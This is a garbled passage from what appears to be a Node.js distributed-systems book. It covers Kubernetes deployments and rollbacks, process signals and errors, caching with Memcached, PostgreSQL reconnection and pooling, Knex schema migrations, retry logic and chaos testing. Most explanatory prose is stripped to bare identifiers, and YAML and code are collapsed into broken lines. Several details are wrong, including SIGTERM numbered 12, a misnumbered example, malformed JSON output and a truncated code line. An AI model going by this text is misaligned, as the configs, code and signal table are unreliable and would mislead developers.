+metadata:labels:
+app:recipe-api
+    
+    matchLabels     recipe-api    spec    metadata     
+example    7-3.recipe-api/recipe-api-deployment.yml,part three
+####note the four space indent spec:
+containers:
+-name:recipe-api image:recipe-api:v1ports:
+-containerPort:1337livenessProbe:
+httpGet:
+path:/recipes/42 port:1337
+initialDelaySeconds:3
+periodSeconds:10
+    recipe-api:v1             livenessProbe     
+    recipe-api     recipe-api:v1     livenessProbe     GET     /recipes/42     
+    yml
+
+    
+$kubectl get pods
+
+    
+
+NAME	READY	STATUS	RESTARTS	AGE
+recipe-api-6fb656695f-clvtd	1/1	Running	0	2m
+...OUTPUT TRUNCATED...				
+recipe-api-6fb656695f-zrbnf	1/1	Running	0	2m
+
+    <POD_NAME>    recipe-api-6fb656695f-clvtd     
+$kubectl describe pods<POD_NAME>|grep Liveness
+
+    
+Liveness:http-get http://:1337/recipes/42
+delay=3s timeout=1s period=10s#success=1#failure=3
+
+    recipe-api/recipe-api-network.yml    
+    
+example    7-4.recipe-api/recipe-api-network.yml
+apiVersion:v1 kind:Service metadata:
+  name:recipe-api-servicespec:
+type:NodePort selector:
+  app:recipe-api ports:
+-protocol:TCP port:80
+targetPort:1337
+    recipe-api-service    
+    recipe-api-service    NodePort     app=recipe-api     
+$kubectl apply-f recipe-api/recipe-api-network.yml
+
+    kubectl get services-o wide     kubectl expose     recipe-api     web-api     
+Service Discovery
+    web-api     recipe-api    
+    recipe-api     
+$minikube addons enable ingress
+$kubectl get pods--namespace kube-system|grep ingress
+
+    kube-system     web-api     minikube     web-api-ingress    web-api-service    web-api     recipe-api     recipe-api     web-api     recipe-api     service discovery     
+
+Figure 7-3.Service discovery overview
+
+    web-api     recipe-api     web-api     
+$cp recipe-api/Dockerfile web-api/Dockerfile
+$cd web-api
+
+    web-api/Dockerfile    producer-http-basic.js     consumer-http-basic.js     
+CMD["node","consumer-http-basic.js"]
+
+    web-api/web-api-deloyment.yml    recipe-api    web-api    
+example    7-5.web-api/web-api-deployment.yml,part one
+apiVersion:apps/v1 kind:Deployment metadata:
+
+name:web-api labels:
+app:web-api
+
+spec:
+replicas:3selector:
+matchLabels:app:web-api
+template:metadata:
+labels:
+app:web-api
+    
+    spec    metadata     
+example    7-6.web-api/web-api-deployment.yml,part two
+####note the four space indent spec:
+containers:
+-name:web-api image:web-api:v1 ports:
+-containerPort:1337 env:
+-name:TARGET
+value:"recipe-api-service"
+    
+    env     TARGET     recipe-api-service    TARGET     recipe-api-service     http://recipe-api-service:80/    
+    
+example    7-7.web-api/web-api-network.yml,part one
+apiVersion:v1 kind:Service metadata:
+  name:web-api-service spec:
+type:NodePort selector:
+  app:web-api ports:
+-port:1337
+    web-api-service    web-api     ---    
+example    7-8.web-api/web-api-network.yml,part two
+---
+apiVersion:networking.k8s.io/v1beta1 kind:Ingress
+metadata:
+name:web-api-ingress annotations:
+nginx.ingress.kubernetes.io/rewrite-target:/$1
+
+spec:
+rules:
+-host:
+example   .org http:
+paths:
+-path:/backend:
+serviceName:web-api-service servicePort:1337
+        
+    metadata.annotations     annotations     
+example   .org     /    web-api-service    web-api     
+    
+$eval$(minikube-p minikube docker-env)#ensure Minikube docker
+$docker build-t web-api:v1.
+$kubectl apply-f web-api-deployment.yml
+$kubectl apply-f web-api-network.yml
+
+    kubectl get pods     web-api     
+$kubectl get ingress web-api-ingress
+
+    
+
+NAME	CLASS	HOSTS	ADDRESS	PORTS	AGE
+web-api-ingress	<none>	
+example   .org	172.17.0.3	80	21s
+
+    <INGRESS_IP>    
+$curl-H"Host:
+example   .org"http://<INGRESS_IP>/
+
+    consumer_pid     producer_pid     
+    web-api    recipe-api    
+Modifying Deployments
+    kubectl get deployments     recipe-api     web-api    recipe-api     recipe-api-6fb656695f    recipe-api-6fb656695f-clvtd    kubectl     
+Scaling Application Instances
+
+    recipe-api     
+$kubectl get pods-l app=recipe-api
+$kubectl scale deployment.apps/recipe-api--replicas=10
+$kubectl get pods-l app=recipe-api
+
+    ContainerCreating    Running    recipe-api/recipe-api-deployment.yml     kubectl apply     kubectl apply     
+$kubectl apply-f recipe-api/recipe-api-deployment.yml
+
+    
+deployment.apps/recipe-api created deployment.apps/recipe-api configured deployment.apps/recipe-api unchanged
+
+    kubectl apply    kubectl apply     recipe-api    
+Deploying New Application Versions
+    
+    web-api:v2     
+$cd web-api
+$echo"server.get('/hello',async()=>'Hello');"\
+>>consumer-http-basic.js
+$eval$(minikube-p minikube docker-env)#ensure Minikube docker
+$docker build-t web-api:v2.
+
+    web-api/web-api-deployment.yml     spec.template.spec.container.image     image:web-api:v1     image:web-api:v2    
+$kubectl apply-f web-api-deployment.yml
+$kubectl get pods-w-l app=web-api
+
+    -w     web-api     v1     v2     v2     v1     v2    v1     
+Figure 7-4.How deployments affect pod state
+
+    web-api-service     /hello     
+$curl`minikube service web-api-service--url`/hello
+
+    
+$kubectl get rs-l app=web-api
+
+    
+
+NAME	DESIRED	CURRENT	READY	AGE
+web-api-6cdc56746b	0	0	0	9m21s
+web-api-999f78685	3	3	3	3m8s
+
+    web-api-999f78685     web-api-6cdc56746b     <DEPLOYMENT>-
+<REPLICA_SET>-<RANDOM>    web-api-deployment.yml     web-api:v1    
+Rolling Back Application Deployments
+    rollback    
+    web-api     /kill     web-api     
+$cd web-api
+$echo"server.get('/kill',async()=>{process.exit(42);});"\
+>>consumer-http-basic.js
+$eval$(minikube-p minikube docker-env)#ensure Minikube docker
+$docker build-t web-api:v3.
+
+    web-api-deployment.yml     web-api:v2     web-api:v3    
+$kubectl apply-f web-api-deployment.yml--record=true
+
+    --record=true     
+$curl`minikube service web-api-service--url`/kill
+
+    kubectl get pods-l
+
+app=web-api     
+
+NAME	READY	STATUS	RESTARTS	AGE
+web-api-6bdcb55856-b6rtw	1/1	Running	0	6m3s
+web-api-6bdcb55856-ctqmr	1/1	Running	1	6m7s
+web-api-6bdcb55856-zfscv	1/1	Running	0	6m5s
+
+    v3     web-api     
+$kubectl rollout history deployment.v1.apps/web-api
+
+    
+REVISION CHANGE-CAUSE
+7	<none>
+8	<none>
+9	kubectl apply--filename=web-api-deployment.yml--record=true
+
+    --record=true     
+v3     v2     <RELEASE_NUMBER>    
+$kubectl rollout undo deployment.v1.apps/web-api\
+--to-revision=<RELEASE_NUMBER>
+
+    deployment.apps/web-api rolled back    kubectl rollout history deployment.v1.apps/web-api     
+REVISION CHANGE-CAUSE
+7	<none>
+9	kubectl apply--filename=web-api-deployment.yml--record=true
+10	<none>
+
+    v2     /kill     
+$kubectl delete services recipe-api-service
+$kubectl delete services web-api-service
+$kubectl delete deployment recipe-api
+
+$kubectl delete deployment web-api
+$kubectl delete ingress web-api-ingress
+$minikube stop
+$minikube delete
+
+    minikube dashboard
+    
+
+1The MacOS variant also installs the HyperKit hypervisor,which is necessary to later use the Ingress feature.
+
+Chapter 8.Resilience
+
+
+    application resilience    web-api     recipe-api    
+The Death of a Node.js Process
+    SIGKILL     
+    process     EventEmitter     exit     
+Table 8-1.Node.js termination from within
+
+Operation	
+example   
+
+
+    
+Process Exit
+    process.exit(code)    
+    process.exit()    return     code         exit status code     stderr     process.exit()    
+$node-e"process.exit(42)";echo$?
+
+    
+    
+function checkConfig(config){if(!config.host){
+console.error("Configuration is missing'host'parameter!");process.exit(1);
+}
+}
+
+    stderr    process.exit()    
+    return     
+
+
+    process.exit(1)    
+$node-e"throw new Error()";echo$?
+
+    
+Exceptions,Rejections,and Emitted Errors
+    process.exit()    Error     Error
+    Error     Error     Error     
+Throw
+    throw     catch     Exception
+    Exception     undefined    Error     Rejection
+    async     Error swallowing
+    
+    
+const lib=require('some-library');try{
+lib.start();
+}catch(e){}//Sometimes lib throws even though it works lib.send('message');
+
+    some-library     lib.start()    some-library     
+catch(e){
+if(e instanceof lib.Errors.ConnectionFallback){
+//swallow error
+}else{
+throw e;//re-throw
+}
+}
+
+    
+    instanceof     .name     e.name==='ConnectionFallback'    .code     ERR_INVALID_URI     .code     .message     e.message.startsWith('Had to fallback')    
+
+
+    
+/tmp/error.js:1
+throw new Error('oh no');
+
+^
+Error:oh no
+at Object.<anonymous>(/tmp/foo.js:1:7)
+...TRUNCATED...
+at internal/main/run_main_module.js:17:47
+
+    /tmp/error.js    process     EventEmitter     uncaughtException     
+const logger=require('./lib/logger.js');process.on('uncaughtException',(error)=>{
+logger.send("An uncaught exception has occured",error,()=>{console.error(error);
+process.exit(1);
+});
+});
+
+    logger     process.exit()    logger.send()    
+    Promise.reject()    .then()    async     async     throw     Promise.reject(new Error('oh no'));(async()=>{
+throw new Error('oh no');
+})();
+
+    
+(node:52298)UnhandledPromiseRejectionWarning:Error:oh no at Object.<anonymous>(/tmp/reject.js:1:16)
+...TRUNCATED...
+at internal/main/run_main_module.js:17:47
+(node:52298)UnhandledPromiseRejectionWarning:Unhandled promise rejection.This error originated either by throwing inside of an async function without a catch block,or by rejecting a promise which was not handled with.catch().
+
+    --unhandled-rejections=strict     process     process.on('unhandledRejection',(reason,promise)=>{});
+
+    uncaughtException     
+    EventEmitter     require('events').EventEmitter    EventEmitter     error     EventEmitter     Error     ERR_UNHANDLED_ERROR    EventEmitter     
+events.js:306
+throw err;//Unhandled'error'event
+^
+Error[ERR_UNHANDLED_ERROR]:Unhandled error.(undefined)at EventEmitter.emit(events.js:304:17)
+at Object.<anonymous>(/tmp/foo.js:1:40)
+...TRUNCATED...
+  at internal/main/run_main_module.js:17:47{code:'ERR_UNHANDLED_ERROR',
+context:undefined
+}
+
+    error         EventEmitter#emit('error',arg)    Error     
+    
+Signals
+Signals     SIGINT     SIGKILL     kill-l     
+Table 8-2.Common signals
+
+Name	Number	Handleable	Node.js default	Signal purpose
+
+SIGHUP	1	Yes	Terminate	Parent terminal has been closed
+
+SIGINT	2	Yes	Terminate	Terminal trying to interrupt,�la Ctrl+C
+
+SIGQUIT	3	Yes	Terminate	Terminal trying to quit,�la Ctrl+D
+
+SIGKILL	9	No	Terminate	Process is being forcefully killed
+
+SIGUSR1	10	Yes	Start Debugger	User-defined signal 1
+
+SIGUSR2	12	Yes	Terminate	User-defined signal 2
+
+SIGTERM	12	Yes	Terminate	Represents a graceful termination
+
+SIGSTOP	19	No	Terminate	Process is being forcefully stopped
+
+    
+    SIGKILL     SIGSTOP     Handleable     Node.js default     SIGUSR1     process     /tmp/signals.js     
+example    8-1./tmp/signals.js
+#!/usr/bin/env node
+console.log(`Process ID:${process.pid}`);process.on('SIGHUP',()=>console.log('Received:SIGHUP'));process.on('SIGINT',()=>console.log('Received:SIGINT'));setTimeout(()=>{},5*60*1000);//keep process alive
+
+    SIGINT     SIGHUP     
+$kill-s SIGHUP<PROCESS_ID>
+
+    kill     kill     
+    kill    process.kill()    
+$node-e"process.kill(<PROCESS_ID>,'SIGHUP')"
+
+    SIGHUP     
+$kill-9<PROCESS_ID>
+
+    SIGKILL     -9     kill     SIGKILL     SIGKILL     process     
+Error:uv_signal_start EINVAL
+
+    SIGTERM     SIGKILL     
+Building Stateless Services
+
+    Single Source of Truth     Data store#1     Data store#2    
+
+Figure 8-1.Hidden state
+
+    
+server.patch('/v1/foo/:id',async(req)=>{const id=req.params.id;
+const body=await req.body();
+await fetch(`http://ds1/foo/${id}`,{method:'patch',body});doSomethingRisky();
+await fetch(`http://ds2/foo/${id}`,{method:'patch',body});return'OK';
+});
+
+    
+    Designing Data-Intensive Applications     
+Avoiding Memory Leaks
+    
+const accounts=new Map();
+
+module.exports.set=(account_id,account)=>{accounts.set(account_id,account);
+};
+
+    SIGTERM     accounts     account_id     set()    
+    cls-hooked         process.namespaces={};function createNamespace(name){
+process.namespaces[name]=namespace;
+}
+
+function destroyNamespace(name){process.namespaces[name]=null;
+}
+
+    process.namespace    null    
+Bounded In-Process Caches
+    not     
+    account:123    cache hit    cache miss    account:123     cache invalidation    
+    lru-cache         Least Recently Used    caching/server.js     
+example    8-2.caching/server.js
+#!/usr/bin/env node
+
+//npm installfastify@3.2lru-cache@6.0node-fetch@2.6const fetch=require('node-fetch');
+const server=require('fastify')();
+const lru=new(require('lru-cache'))({max:4096,
+length:(payload,key)=>payload.length+key.length,maxAge:10*60*1_000
+});
+const PORT=process.env.PORT||3000;
+
+server.get('/account/:account',async(req,reply)=>{return getAccount(req.params.account);
+});
+server.listen(PORT,()=>console.log(`http://localhost:${PORT}`));
+
+async function getAccount(account){const cached=lru.get(account);
+if(cached){console.log('cache hit');return JSON.parse(cached);}console.log('cache miss');
+const result=await fetch(`https://api.github.com/users/${account}`);const body=await result.text();
+lru.set(account,body);return JSON.parse(body);
+
+}
+        
+    curl     
+$node caching/server.js
+$time curl http://localhost:3000/account/tlhunter
+$time curl http://localhost:3000/account/nodejs
+$time curl http://localhost:3000/account/tlhunter
+
+
+    cache miss     server.js     cache miss     cache hit     express     fastify    tlhunter     cache miss    lru-cache     tlhunter     
+    JSON.parse()    web-api     recipe-api    web-api     recipe-api     web-api     recipe-api     
+$PORT=4000 node server.js
+$time curl http://localhost:4000/account/tlhunter
+
+    
+External Caching with Memcached
+    In-memory cache
+    External cache
+    No cache
+    
+    recipe-api     web-api    
+Introducing Memcached
+    Memcached    set(key,val,expire)    get(key1[,key2�])    add(key,val,expire)    incr(key,amount)    decr(key,amount)    replace(key,val,expire)    delete(key)    flush_all()    append(key,val,expire)    prepend(key,val,expire)    gets(key)    cas(key,val,cas_id,expire)    
+
+
+Running Memcached
+    -d     -m     -v     
+$docker run\
+--name distnode-memcached\
+-p 11211:11211\
+-it--rm memcached:1.6-alpine\memcached-m 64-vv
+
+    -it     --rm     
+    
+Caching Data with Memcached
+    caching/server.js     caching/server-ext.js    
+example    8-3.caching/server-ext.js
+#!/usr/bin/env node
+
+//npm installfastify@3.2memjs@1.2node-fetch@2.6const fetch=require('node-fetch');
+const server=require('fastify')();const memcache=require('memjs')
+  .Client.create('localhost:11211');const PORT=process.env.PORT||3000;
+
+server.get('/account/:account',async(req,reply)=>{return getAccount(req.params.account);
+});
+server.listen(PORT,()=>console.log(`http://localhost:${PORT}`));
+
+async function getAccount(account){
+const{value:cached}=await memcache.get(account);
+if(cached){console.log('cache hit');return JSON.parse(cached);}console.log('cache miss');
+const result=await fetch(`https://api.github.com/users/${account}`);const body=await result.text();
+await memcache.set(account,body,{});return JSON.parse(body);
+}
+        .get()    .set()    
+    
+    memjs     .get()    .set()    .get()    .value     JSON.parse()    .toString()    .set()    options     memjs     
+$node caching/server-ext.js
+$PORT=4000 node caching/server-ext.js
+
+    
+$time curl http://localhost:3000/account/tlhunter#miss
+$time curl http://localhost:3000/account/tlhunter#hit
+$time curl http://localhost:4000/account/tlhunter#hit
+
+    
+Data Structure Mutations
+
+    
+{
+"account":{
+"id":7,
+"balance":100
+}
+}
+
+    r1..r5    r6     
+    {
+"id":"7",
+"balance":100
+}
+
+    id     account-info-<ACCOUNT_ID>    account-info-7    r1..r5     
+async function reduceBalance(account_id,item_cost){const key=`account-info-${account_id}`;
+const account=await cache.get(key);
+const new_balance=account.account.balance-item_cost;return new_balance;
+}
+
+    r6     
+const new_balance=account.balance-item_cost;
+
+    r6     account.balance     r5     r6     
+    account-info-
+<ACCOUNT_ID>    account-info-<VERSION>-<ACCOUNT_ID>    r5     r6    account-info     v1     v2    account-info-v1-7     account-info-v2-7    account-info     
+Database Connection Resilience
+    
+    
+Running PostgreSQL
+    PostgreSQL     
+$docker run\
+--name distnode-postgres\
+-it--rm\
+-p 5432:5432\
+-e POSTGRES_PASSWORD=hunter2\
+-e POSTGRES_USER=user\
+-e POSTGRES_DB=dbconn\postgres:12.3
+
+Automatic Reconnection
+    
+    pg     dbconn/reconnect.js     
+example    8-4.dbconn/reconnect.js,part one of two
+#!/usr/bin/env node
+
+//npm installfastify@3.2pg@8.2
+const DatabaseReconnection=require('./db.js');const db=new DatabaseReconnection({
+host:'localhost',port:5432,user:'user',password:'hunter2',database:'dbconn',retry:1_000
+});
+db.connect();
+db.on('error',(err)=>console.error('db error',err.message));db.on('reconnect',()=>console.log('reconnecting...'));
+db.on('connect',()=>console.log('connected.'));db.on('disconnect',()=>console.log('disconnected.'));
+
+    DatabaseReconnection     db.js         
+    DatabaseReconnection     pg     retry     error     
+example    8-5.dbconn/reconnect.js,part two of two
+const server=require('fastify')();server.get('/foo/:foo_id',async(req,reply)=>{
+try{
+var res=await db.query(
+'SELECT NOW()AS time,$1 AS echo',[req.params.foo_id]);
+}catch(e){reply.statusCode=503;return e;
+}
+return res.rows[0];
+});
+server.get('/health',async(req,reply)=>{
+if(!db.connected){throw new Error('no db connection');}return'OK';
+});
+server.listen(3000,()=>console.log(`http://localhost:3000`));
+        
+    
+    GET/foo/:foo_id    db.query()    time     echo     GET/health     DatabaseReconnection     .connected    DatabaseReconnection     dbconn/db.js     
+example    8-6.dbconn/db.js,part one of three
+const{Client}=require('pg');
+const{EventEmitter}=require('events');
+
+class DatabaseReconnection extends EventEmitter{#client=null;	#conn=null;
+#kill=false;	connected=false;
+
+constructor(conn){super();this.#conn=conn;
+}
+
+    pg     DatabaseReconnection     EventEmitter    events     
+    client    pg.Client     conn    kill    connected    
+example    8-7.dbconn/db.js,part two of three
+connect(){
+if(this.#client)this.#client.end();if(this.kill)return;
+const client=new Client(this.#conn);client.on('error',(err)=>this.emit('error',err));client.once('end',()=>{
+if(this.connected)this.emit('disconnect');this.connected=false;
+if(this.kill)return;
+setTimeout(()=>this.connect(),this.#conn.retry||1_000);
+});
+client.connect((err)=>{this.connected=!err;
+if(!err)this.emit('connect');
+});
+this.#client=client;this.emit('reconnect');
+}
+        
+    connect()    DatabaseReconnection     connect()    kill     disconnect()    client    client.on('error')    end     disconnect     connection     connect()    connected     connect     pg     end     connect()    client     reconnect     
+example    8-8.dbconn/db.js,part three of three
+async query(q,p){
+if(this.#kill||!this.connected)throw new Error('disconnected');return this.#client.query(q,p);
+}
+
+disconnect(){this.#kill=true;this.#client.end();
+}
+}
+module.exports=DatabaseReconnection;
+    query()    pg.Client     pg.Client#query()
+    disconnect()    kill     pg.Client     .end()    kill     end     end     
+
+
+    reconnect.js     
+$curl http://localhost:3000/foo/hello
+>{"time":"2020-05-18T00:31:58.494Z","echo":"hello"}
+$curl http://localhost:3000/health
+>OK
+
+    
+connected.
+db error terminating connection due to administrator command db error Connection terminated unexpectedly
+disconnected.reconnecting...reconnecting...
+
+    
+$curl http://localhost:3000/foo/hello
+>{"statusCode":503,"error":"Service Unavailable",
+>"message":"disconnected"}
+$curl http://localhost:3000/health
+>{"statusCode":error":"Internal Server Error",
+>"message":"no db connection"}
+
+    connected     
+    
+reconnecting...reconnecting...connected.
+
+    curl     
+Connection Pooling
+    pg     pg.Pool     pg.Client    dbconn/pool.js     
+example    8-9.dbconn/pool.js
+#!/usr/bin/env node
+
+//npm installfastify@3.2pg@8.2const{Pool}=require('pg');
+
+const db=new Pool({
+host:'localhost',port:5432,user:'user',password:'hunter2',
+database:'dbconn',max:process.env.MAX_CONN||10
+});
+db.connect();
+
+const server=require('fastify')();server.get('/',async()=>(
+  await db.query("SELECT NOW()AS time,'world'AS hello")).rows[0]);server.listen(3000,()=>console.log(`http://localhost:3000`));
+
+    max     MAX_CONN     pg.Pool     dbconn/pool.js     
+$MAX_CONN=100 node./dbconn/pool.js
+$autocannon-c 200 http://localhost:3000/
+
+    dbconn/pool.js     
+$MAX_CONN=101 node./dbconn/pool.js
+$autocannon-c 200 http://localhost:3000/
+
+    
+SELECT*FROM pg_settings WHERE name='max_connections';
+
+    
+100/2=50;50/6=8.3
+
+    
+
+
+    
+example    8-10.dbconn/serial.js
+#!/usr/bin/env node
+//npm installpg@8.2
+const{Client}=require('pg');const db=new Client({
+host:'localhost',port:5432,user:'user',password:'hunter2',database:'dbconn'
+});
+db.connect();
+(async()=>{
+const start=Date.now();await Promise.all([
+db.query("SELECT pg_sleep(2);"),db.query("SELECT pg_sleep(2);"),
+]);
+console.log(`took${(Date.now()-start)/1000}seconds`);db.end();
+
+})();
+    
+    pg_sleep()    Client     Pool     pg     
+Schema Migrations with Knex
+    schema migration     
+    
+000001.sql 000001-reverse.sql 000002.sql 000002-reverse.sql 000003.sql 000003-reverse.sql
+
+    000004.sql     000005.sql    
+20200523133741_create_users.js 20200524122328_create_groups.js 20200525092142_make_admins.js
+
+    knex_migrations    
+    
+Configuring Knex
+    migrations/    knex     knex     package.json         
+$mkdir migrations&&cd migrations
+$npm init-y
+$npm installknex@0.21pg@8.2
+$npm install-gknex@0.21
+$knex init
+
+    knexfile.js    knex     development     SQLite    staging     production     knexfile.js    development     
+    migrations/knexfile.js         
+example    8-1.migrations/knexfile.js
+module.exports={development:{
+client:'pg',connection:{
+host:'localhost',port:5432,user:'user',password:'hunter2',database:'dbconn'
+}
+}
+};
+    
+$knex migrate:currentVersion
+>Using environment:development
+>Current Version:none
+
+    development     NODE_ENV     none    
+Creating a Schema Migration
+    users     
+$knex migrate:make create_users
+$ls migrations
+
+    knex migrate:make     migrations/    20200525141008_create_users.js    
+    
+example    8-12.migrations/migrations/20200525141008_create_users.js
+module.exports.up=async(knex)=>{
+await knex.schema.createTable('users',(table)=>{table.increments('id').unsigned().primary();table.string('username',24).unique().notNullable();
+});
+
+await knex('users')
+.insert([
+{username:'tlhunter'},
+{username:'steve'},
+{username:'bob'},
+]);
+};
+
+module.exports.down=(knex)=>knex.schema.dropTable('users');
+
+    up()    down()    up()    down()    users     id     username    up()    down()    up()    down()    down()    users     
+$knex migrate:list
+>No Completed Migration files Found.
+>Found 1 Pending Migration file/files.
+>20200525141008_create_users.js
+
+    
+Applying a Migration
+    
+$knex migrate:up
+>Batch 1 ran the following migrations:
+>20200525141008_create_users.js
+
+    knex migrate:up     psql     
+$docker exec\
+-it distnode-postgres\psql-U user-W dbconn
+
+    hunter2     dbconn     \dt     
+Schema|	Name	|Type|Owner
+--------+----------------------+-------+-------
+public|knex_migrations|table|user public|knex_migrations_lock|table|user public|users	|table|user
+
+    users     
+    SELECT*FROM users;    
+id|username
+----+----------
+1|tlhunter
+2|steve
+3|bob
+
+    
+CREATE TABLE users(
+id serial NOT NULL,
+username varchar(24)NOT NULL,CONSTRAINT users_pkey PRIMARY KEY(id),
+CONSTRAINT users_username_unique UNIQUE(username));
+
+    SELECT*FROM knex_migrations;    
+id|	name	|batch|	migration_time
+----+--------------------------------+-------+---------------------------
+2|20200525141008_create_users.js|	1|2020-05-25 22:17:19.15+00
+
+    20200525141008_create_users.js     knex_migrations_lock    
+    
+$knex migrate:make create_groups
+
+    
+example    8-13.migrations/migrations/20200525172807_create_groups.js
+module.exports.up=async(knex)=>{await knex.raw(`CREATE TABLE groups(
+id SERIAL PRIMARY KEY,
+name VARCHAR(24)UNIQUE NOT NULL)`);
+await knex.raw(`INSERT INTO groups(id,name)VALUES(1,'Basic'),(2,'Mods'),(3,'Admins')`);
+await knex.raw(`ALTER TABLE users ADD COLUMN
+group_id INTEGER NOT NULL REFERENCES groups(id)DEFAULT 1`);
+};
+
+module.exports.down=async(knex)=>{
+await knex.raw(`ALTER TABLE users DROP COLUMN group_id`);await knex.raw(`DROP TABLE groups`);
+};
+    groups     users     group_id     groups     
+$knex migrate:latest
+
+    create_groups     migrate     
+Rolling Back a Migration
+    
+$knex migrate:down
+
+    
+Batch 2 rolled back the following migrations:20200525172807_create_groups.js
+
+    down()    create_groups     knex migrate:list     
+--WARNING:DESTRUCTIVE MIGRATION!
+--MIGRATE UP
+ALTER TABLE users DROP COLUMN username;
+--MIGRATE DOWN
+ALTER TABLE users ADD COLUMN username VARCHAR(24)UNIQUE NOT NULL;
+
+    username     username     
+Live Migrations
+    
+
+Figure 8-2.Broken migration timeline
+
+    live migration     Live migration scenario
+    
+CREATE TABLE people(id SERIAL,
+fname VARCHAR(20)NOT NULL,lname VARCHAR(20)NOT NULL);
+
+    
+async function getUser(id){const result=await db.raw(
+  'SELECT fname,lname FROM people WHERE id=$1',[id]);const person=result.rows[0];
+return{id,fname:person.fname,lname:person.lname};
+}
+
+async function setUser(id,fname,lname){await db.raw(
+'UPDATE people SET fname=$1,lname=$2 WHERE id=$3',[fname,lname,id]);
+}
+
+        fname     lname     name     Commit A:Beginning the transition
+    name     fname     lname     or     name     name     NOT NULL     
+    ALTER     NOT NULL     up()    
+ALTER TABLE people ADD COLUMN name VARCHAR(41)NULL;ALTER TABLE people ALTER COLUMN fname DROP NOT NULL;ALTER TABLE people ALTER COLUMN lname DROP NOT NULL;
+
+    name     name     name     fname     lname     
+async function getUser(id){const result=await db.raw(
+  'SELECT*FROM people WHERE id=$1',[id]);const person=result.rows[0];
+const name=person.name||`${person.fname}${person.lname}`;return{id,name};
+}
+
+async function setUser(id,name){await db.raw(
+'UPDATE people SET name=$1 WHERE id=$2',[name,id]);
+}
+
+    name     setUser()    Commit B:Backfill
+
+    backfill     name     name     fname     lname     up()    UPDATE people SET name=CONCAT(fname,'',lname)WHERE name IS NULL;
+
+    
+WHERE name IS NULL AND id>=103000 AND id<104000
+
+    Commit C:Finishing the transition
+    up()    
+ALTER TABLE people ALTER COLUMN name SET NOT NULL;
+ALTER TABLE people DROP COLUMN fname;ALTER TABLE people DROP COLUMN lname;
+
+    getUser()    fname     lname     
+async function getUser(id){const result=await db.raw(
+  'SELECT name FROM people WHERE id=$1',[id]);return{id,name:result.rows[0].name};
+}
+
+    setUser()    
+Figure 8-3.Working migration timeline
+
+    name     name     name     
+    
+Idempotency and Messaging Resilience
+    
+    
+Figure 8-4.Protocol errors
+
+    Error#code     
+Table 8-3.Node.js network errors
+
+Error	Context	Ambiguous	Meaning
+
+EACCES	Server	N/A	Cannot listen on port due to permissions
+
+EADDRINUSE	Server	N/A	Cannot listen on port since another process has it
+
+ECONNREFUSED	Client	No	Client unable to connect to server
+
+
+
+ENOTFOUND	Client	No	DNS lookup for the server failed
+
+ECONNRESET	Client	Yes	Server closed connection with client
+
+EPIPE	Client	Yes	Connection to server has closed
+
+ETIMEDOUT	Client	Yes	Server didn�t respond in time
+
+    EACCESS     EADDRINUSE    EACCESS     EADDRINUSE     ECONNREFUSED     ENOTFOUND     
+HTTP Retry Logic
+    
+
+Figure 8-5.HTTP retry flowchart
+    ECONNREFUSED     ENOTFOUND    ECONNRESET    EPIPE    ETIMEDOUT    
+Table 8-4.HTTP method matrix
+
+Method	Idempotent	Destructive	Safe	4XX	5XX	Ambiguous	Purpose
+
+GET	Yes	No	Yes	No Retry	Retry	Retry	Retrieve resource(s)
+
+POST	No	No	No	No Retry	No Retry	No Retry	Create resource
+
+PUT	Yes	Yes	No	No Retry	Retry	Retry	Create or modify resource
+
+PATCH	No	Yes	No	No Retry	Retry	Retry	Modify resource
+
+DELETE Yes	Yes	No	No Retry
+
+Retry	Retry	Remove resource
+
+
+
+
+    GET     DELETE/recipes/42    PUT     PATCH     DELETE     ETag     If-Match    GET     
+    idempotency key    |5000ms|...
+
+    ioredis     ioredis     
+const Redis=require('ioredis');const DEFAULT=5000;
+const SCHEDULE=[100,250,500,1000,2500];
+const redis=new Redis({retryStrategy:(times)=>{
+return SCHEDULE[times]||DEFAULT;
+}
+});
+
+    retrySchedule()    
+    
+10ms|20ms|40ms|quit
+
+    thundering herd    
+Figure 8-7.Thundering herd
+
+    jitter     
+    
+const redis=new Redis({retryStrategy:(times)=>{
+let time=SCHEDULE[times]||DEFAULT;
+return Math.random()*(time*0.2)+time*0.9;//�10%
+}
+});
+
+    setInterval(fn,60_000)    
+const PERIOD=60_000;
+const OFFSET=Math.random()*PERIOD;setTimeout(()=>{
+setInterval(()=>{syncStats();
+},PERIOD);
+},OFFSET);
+
+    
+071 077 102 131 137 162 191 197 222
+
+    
+060 060 060 120 120 120 180 180 180
+
+
+Resilience Testing
+    chaos engineering    
+Random Crashes
+
+    
+example    8-14.Random crash chaos
+if(process.env.NODE_ENV==='staging'){
+const LIFESPAN=Math.random()*100_000_000;//0-30 hours setTimeout(()=>{
+console.error('chaos exit');process.exit(99);
+},LIFESPAN);
+}
+    stderr    
+Event Loop Pauses
+    
+    
+example    8-15.Random event loop pauses
+const TIMER=100_000;function slow(){
+fibonacci(1_000_000n);
+setTimeout(slow,Math.random()*TIMER);
+}
+setTimeout(slow,Math.random()*TIMER);
+    
+Random Failed Async Operations
+    
+example    8-16.Random async failures
+const THRESHOLD=10_000;
+async function chaosQuery(query){
+if(math.random()*THRESHOLD<=1){throw new Error('chaos query');
+}
+return db.query(query);
+
+}
+const result=await chaosQuery('SELECT foo FROM bar LIMIT 1');return result.rows[0];
+
+    chaosQuery()    db.query()    node-fetch
+    
+
+    An exit status can also be set by assigning a code to process.exitStatus and then calling
+process.exit()without an argument.
+1	There�s also a process.abort()method available.Calling it immediately terminates the process,prints some memory locations,and writes a core dump file to disk if the OS is configured to do so.
+2The deprecated internal domain module provides a way to capture error events from many
+EventEmitter instances.
+3I reported this issue to the package author two years ago.Fingers crossed!
+4	Languages like Rust and C++allow for extremely accurate memory calculations;with JavaScript,we can only work with approximations.
+5You can also avoid globally installing knex by prefixing each of the commands with npx,such as
+npx knex init.
+6Some systems think that my first name is�Thomas Hunter�and my last name is�II.�
+
+Chapter 9.Distributed Primitives
+
+
+    Map     Array#push()    Array#pop()    JSON.stringify()    fs.writeFileSync()    
+The ID Generation Problem
+    �How would you design a link shortening service?�
+    uire('fs');fs.writeFileSync('/tmp/count.txt','0');//only run once function setUrl(url){
+const id=Number(fs.readFileSync('/tmp/count.txt').toString())+1;fs.writeFileSync('/tmp/count.txt',String(id));fs.writeFileSync(`/tmp/${id}.txt`,url);
+return`sho.rt/${id}`;
+}
+function getUrl(code){
+return fs.readFileSync(`/tmp/${code}.txt`).toString();
+}
+    setUrl()
+    counter     /tmp/    setUrl()    getUrl()    
+
+Figure 9-1.Single-threaded get and set operations
+    client     logic     counter     map     setUrl()    getUrl()    101.txt    
